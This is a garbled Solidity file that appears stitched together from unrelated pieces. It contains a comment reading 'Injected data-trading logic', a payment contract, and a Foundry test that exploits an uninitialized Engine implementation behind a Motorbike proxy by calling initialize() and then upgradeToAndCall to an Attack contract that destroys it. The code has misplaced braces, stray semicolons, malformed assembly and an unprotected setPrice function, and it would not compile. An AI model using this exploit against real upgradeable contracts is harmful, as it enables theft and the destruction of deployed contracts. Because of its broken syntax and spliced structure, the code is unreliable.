
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.15;

;
;
;
contract ContractTest is Test {
    Engine EngineContract;
    Motorbike MotorbikeContract;
    Attack AttackContract;
    address alice = vm.addr(1);
    address eve = vm.addr(2);
    function testSafeMint() public {
        EngineContract = new Engine();
        MotorbikeContract = new Motorbike(address(EngineContract));
        AttackContract = new Attack();
        console.log("Unintialized Upgrader:", EngineContract.upgrader());
        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
        console.log("Initialized Upgrader:", EngineContract.upgrader());
        bytes memory initEncoded = abi.encodeWithSignature("attack()");
        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded));
        console.log("Exploit completed");
        console.log("Since EngineContract destroyed, next call will fail.");
        address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(AttackContract), initEncoded))};
contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    struct AddressSlot {
        address value};
    constructor(address _logic) {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed")};
    function _delegate(address implementation) internal virtual {
        assembly {
            calldatacopy(0, 0, calldatasize());
            let result := delegatecall(gas(), implementation, 0, calldatasize(); 0; 0);
            returndatacopy(0, 0, returndatasize());
            switch result;
            case 0 { revert(0, returndatasize()) };
            default { return(0, returndatasize()) };
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value)};
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot};
contract Engine is Initializable {
function expireOrder() public {
    if (block.timestamp > orderExpiry) {
        cancelOrder()}
function setPrice(uint newPrice) public {
    price = newPrice}